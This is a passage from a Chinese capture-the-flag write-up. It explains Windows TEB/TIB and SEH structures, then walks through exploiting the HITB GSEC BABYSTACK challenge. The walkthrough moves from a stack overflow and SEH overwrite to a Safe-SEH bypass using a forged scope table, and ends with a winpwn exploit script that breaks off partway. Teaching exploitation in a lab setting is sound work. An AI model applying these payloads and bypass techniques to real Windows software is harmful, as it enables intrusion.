      PVOID ReservedForOle;
      PVOID Reserved6[4];
      PVOID TlsExpansionSlots;
    } TEB, *PTEB;
`TIB`没有在`Windows`文档中说明，这里从`Wine`中可以看到结构如下：
    // Code in https://source.winehq.org/source/include/winnt.h#2635
    typedef struct _NT_TIB{
        struct _EXCEPTION_REGISTRATION_RECORD *Exceptionlist; // 指向当前线程的 SEH
        PVOID StackBase;    // 当前线程所使用的栈的栈底
        PVOID StackLimit;   // 当前线程所使用的栈的栈顶
        PVOID SubSystemTib; // 子系统
        union {
            PVOID FiberData;
            ULONG Version;
        };
        PVOID ArbitraryUserPointer;
        struct _NT_TIB *Self; //指向TIB结构自身
    } NT_TIB;
在这个结构中与异常处理有关的成员是指向`_EXCEPTION_REGISTRATION_RECORD`结构的`Exceptionlist`指针
####  `_EXCEPTION_REGISTRATION_RECORD`结构体
该结构体主要用于描述线程异常处理句柄的地址，多个该结构的链表描述了多个线程异常处理过程的嵌套层次关系。
结构内容为：
    //  Code in https://source.winehq.org/source/include/winnt.h#2623
    typedef struct _EXCEPTION_REGISTRATION_RECORD{
        struct _EXCEPTION_REGISTRATION_RECORD *Next; // 指向下一个结构的指针
        PEXCEPTION_ROUTINE Handler; // 当前异常处理回调函数的地址
    }EXCEPTION_REGISTRATION_RECORD;
###  新机制——导入表和导出表
Windows程序没有延迟绑定机制自然也就没有`PLT/GOT`表，但是`Windows`程序显然也是要调用所谓的库函数的，`Windows`下的函数库是`DLL`文件，类似于`Unix`下的`libc`文件，程序调用库函数需要借助的就是导入表和导出表了。
导入表是`PE`数据组织中的一个很重要的组成部分，它是为实现代码重用而设置的。通过分析导入表数据，可以获得诸如`PE`文件的指令中调用了多少外来函数，以及这些外来函数都存在于哪些动态链接库里等信息。`Windows`加载器在运行`PE`时会将导入表中声明的动态链接库一并加载到进程的地址空间，并修正指令代码中调用的函数地址。在数据目录中一共有四种类型的数据与导入表数据有关：
导入表、导入函数地址表、绑定导入表、延迟加载导入表。
程序中，导入表的地址通常位于`.idata`段
## 0x04 以[HITB GSEC]BABYSTACK为例
###  程序保护检查
###  程序漏洞分析
程序漏洞还是较为明显的：
在`Line 34`中，我们向`choice`这个局部变量写入了`0x100`个字节，这会造成栈溢出漏洞.
同时我们事实上可以发现程序中预留了后门语句
那么我们接下来只要能劫持`EIP`就能成功完成漏洞利用，程序开启了`GS`保护，因此我们无法直接劫持返回地址。
进一步分析`main`函数发现，程序在`main`中注册了一个异常处理函数，如果一个程序中注册了一个异常处理函数，那么当该函数运行发生异常时将会由该异常处理函数进行异常的捕获及处理。
我们尝试使用`WinDbg`附加到此程序，然后尝试读`0`地址处的值。
发现程序确实转而去调用注册了的`SEH`了，又发现，程序在压入`EBP`后，压入栈的第三个数即为`SEH`地址，恰好在我们的可控范围，于是我们可以依据此来控制执行流。
###  程序漏洞利用
####  控制执行流
首先我们来写一个不触发漏洞利用的交互EXP
    Stack_address = get_address(sh=sh,info="[+] STACK ADDRESS IS ",start_string="stack address = 0x",end_string="x0A",int_mode=True)
    PIE_address   = get_address(sh=sh,info="[+] PIE ADDRESS IS ",start_string="main address = 0x",end_string="x0A",offset=-0x10B0,int_mode=True)
    sh.recvuntil('Do you want to know more?')
    sh.sendline('noo')
    payload = 'A' * 0x10
    get_gdb(sh)
    sh.sendline(payload)
    sh.recvuntil('Do you want to know more?')
    sh.sendline('yes')
    sh.recvuntil('Where do you want to know')
    sh.sendline('0')
    sh.interactive()
可以发现，异常正常被捕获，接下来，我们来写一个触发漏洞利用的交互EXP
    Stack_address = get_address(sh=sh,info="[+] STACK ADDRESS IS ",start_string="stack address = 0x",end_string="x0A",int_mode=True)
    PIE_address   = get_address(sh=sh,info="[+] PIE ADDRESS IS ",start_string="main address = 0x",end_string="x0A",offset=-0x10B0,int_mode=True)
    sh.recvuntil('Do you want to know more?')
    sh.sendline('noo')
    payload = 'A' * 0x90 + p32(0xDEADBEEF)
    get_gdb(sh)
    sh.sendline(payload)
    sh.recvuntil('Do you want to know more?')
    sh.sendline('yes')
    sh.recvuntil('Where do you want to know')
    sh.sendline('0')
    sh.interactive()
可以发现，原有的异常捕获函数将不再被运行。
####  `Safe-SEH`绕过
但我们注意到，尽管我们已经屏蔽了原有的`SEH`，但是，我们没有将流程劫持到`0xDEADBEEF`！
这是因为`Safe-SEH`的开启，导致不在`__safe_se_handler_table`中的`SEH`均不会被运行，那么就不限于`0xDEADBEEF`了，程序预留的后门必然也不是不合条件的`SEH`，那么我们接下来就要绕过`Safe-SEH`了。
那么，我们来分析程序中注册的`__except_handler4`异常，由于`Windows`是不开源的系统，因此我们只能通过逆向的手段来去查看相关伪代码，相关代码存在于`MSVCRT.dll`。
将代码进行简单的优化以及重命名可以得到以下伪代码：
    int __cdecl _except_handler4_common(unsigned int *CookiePointer, void (__fastcall *CookieCheckFunction)(unsigned int), _EXCEPTION_RECORD *ExceptionRecord, _EXCEPTION_REGISTRATION_RECORD *EstablisherFrame, _CONTEXT *ContextRecord)
    {
        ScopeTable = (_EH4_SCOPETABLE *)(*CookiePointer ^ EstablisherFrame + 8);
        ValidateLocalCookies(CookieCheckFunction, ScopeTable, &EstablisherFrame + 16);
        __except_validate_context_record(ContextRecord);
        if ( ExceptionRecord->ExceptionFlags & 0x66 )
        {
            ......
        }
        else
        {
            exceptionPointers.ExceptionRecord = ExceptionRecord;
            exceptionPointers.ContextRecord   = ContextRecord;
            tryLevel = *(_DWORD *)(EstablisherFrame + 12);
            *(_DWORD *)(EstablisherFrame - 4) = &ExceptionPointers;
            if ( tryLevel != -2 )
            {
                do
                {
                    v8 = tryLevel + 2 * (tryLevel + 2);
                    filterFunc = *(&ScopeTable->GSCookieOffset + v8);
                    scopeTableRecord = &ScopeTable->GSCookieOffset + v8;
                    encloseingLevel = scopeTableRecord->EnclosingLevel;
                    if ( filterFunc )
                    {
                        // 调用 FilterFunc
                        filterFuncRet = _EH4_CallFilterFunc(filterFunc, EstablisherFrame + 2);
                        ......
                    if ( filterFuncRet > 0 )
                    {
                        // 调用 HandlerFunc
                        _EH4_TransferToHandler(scopeTableRecord->HandlerFunc, v5);
                        ......
                    }
                }
                else
                {
                    ......
                }
                tryLevel = encloseingLevel;
            }while ( encloseingLevel != -2 );
            ......
            }
        }
    ......
    }
分析可以发现，在`Line 32`处，程序实际执行了`filterFunc(EstablisherFrame +
2)`，那么，我们只需要控制`filterFunc`和`EstablisherFrame`这两个值事实上就可以控制执行流程了。
那么我们来看`SEH`的栈结构：
                                                      Scope Table
                                                  +-------------------+
                                                  |  GSCookieOffset   |
                                                  +-------------------+
                                                  | GSCookieXorOffset |
                                                  +-------------------+
                    EH4 Stack                     |  EHCookieOffset   |
              +-------------------+               +-------------------+
    High      |      ......       |               | EHCookieXorOffset |
              +-------------------+               +-------------------+
    ebp       |        ebp        |   +----------->  EncloseingLevel   0xFFFFFFFE
              +-------------------+   | Level 0   +-------------------+  |
    ebp - 04h |     TryLevel      +---+           |     FilterFunc    |  |
              +-------------------+   |           +-------------------+  |
    ebp - 08h |    Scope Table    |   |           |    HandlerFunc    |  |
              +-------------------+   |           +-------------------+  |
    ebp - 0Ch | ExceptionHandler  |   +----------->  EncloseingLevel  +--+-> 0x00000000
              +-------------------+     Level 1   +-------------------+
    ebp - 10h |       Next        |               |     FilterFunc    |
              +-------------------+               +-------------------+
    ebp - 14h | ExceptionPointers +----+          |    HandlerFunc    |
              +-------------------+    |          +-------------------+
    ebp - 18h |        esp        |    |
              +-------------------+    |            ExceptionPointers
    Low       |      ......       |    |          +-------------------+
              +-------------------+    +---------->  ExceptionRecord  |
                                                  +-------------------+
                                                  |   ContextRecord   |
                                                  +-------------------+
在处理程序的一开始我们可以看到，为了要伪造`FilterFunc`，我们需要知道`CookiePointer`的值，这个值储存在`__security_cookie`的内存处，且与程序加载位置偏移固定，于是可以直接通过`main`函数地址的位置进行计算获得！
事实上，接下来其实还有个问题，在异常处理中可以看到有`ValidateLocalCookies(CookieCheckFunction,
ScopeTable, &EstablisherFrame + 16);`我们来看看此处的实现：
    void __cdecl ValidateLocalCookies(void (__fastcall *cookieCheckFunction)(unsigned int), _EH4_SCOPETABLE *scopeTable, char *framePointer)
    {
        unsigned int v3; // esi@2
        unsigned int v4; // esi@3
        if ( scopeTable->GSCookieOffset != -2 )
        {
            v3 = *(_DWORD *)&framePointer[scopeTable->GSCookieOffset] ^ (unsigned int)&framePointer[scopeTable->GSCookieXOROffset];
            __guard_check_icall_fptr(cookieCheckFunction);
            ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v3);
        }
        v4 = *(_DWORD *)&framePointer[scopeTable->EHCookieOffset] ^ (unsigned int)&framePointer[scopeTable->EHCookieXOROffset];
        __guard_check_icall_fptr(cookieCheckFunction);
        ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v4);
    }
这里事实上就是检查要求`*(_DWORD *)&framePointer[scopeTable->EHCookieOffset] ^ (unsigned
int)&framePointer[scopeTable->EHCookieXOROffset]`的值必须为`__security_cookie`，以及`*(_DWORD
*)&framePointer[scopeTable->GSCookieOffset] ^ (unsigned
int)&framePointer[scopeTable->GSCookieXOROffset]`的值必须为`__security_cookie`。
从上图的结构图可以看出我们事实上可以劫持`scopeTable`的地址！那么我们可以让`scopeTable->GSCookieOffset`的值为`-2`，这样程序将不会继续检查`*(_DWORD
*)&framePointer[scopeTable->GSCookieOffset] ^ (unsigned
int)&framePointer[scopeTable->GSCookieXOROffset];`。
那么我们可以构造`Payload`:
    payload  = 'a' * 0x10
    payload += p32(0x0FFFFFFFE)                               # scopeTable -> GSCookieOffset
    payload += p32(0)
    payload += p32(0x0FFFFFFCC)                               # scopeTable -> EHCookieOffset
    payload += p32(0)
    payload  = payload.ljust(0x70, 'b')
    payload += p32(GS_Cookie)                      # framePointer[scopeTable->EHCookieOffset]
    payload += 'c' * 0x20
    payload += p32(stack_address + 0xD4)
    payload += p32(PIE_address + 0x1460)
    payload += p32((stack_address + 0x10) ^ security_cookie)   # scopeTable
    payload += p32(0)
    payload += 'd' * 0x10                                      # framePointer
可以发现，该检查已经通过！
####  最终劫持控制流到Shell
接下来我们只需要伪造`FilterFunc`到程序后门即可完成利用。
###  Final Exploit
    from winpwn import *
    import os
    import traceback
    import sys
    context.log_level='debug'
    # context.arch='amd64'
    context.arch='i386'
    # file_name=ELF('./file_name', checksec = False)
    def get_sh():
        if len(sys.argv) > 1 and sys.argv[1] == 'REMOTE' :
            return remote(sys.argv[2],sys.argv[3])
        else:
            return process("./BABYSTACK.exe")
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string).strip(end_string),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].strip(end_string).ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            print(info + str(hex(return_address)))
        return return_address
    # def get_flag(sh):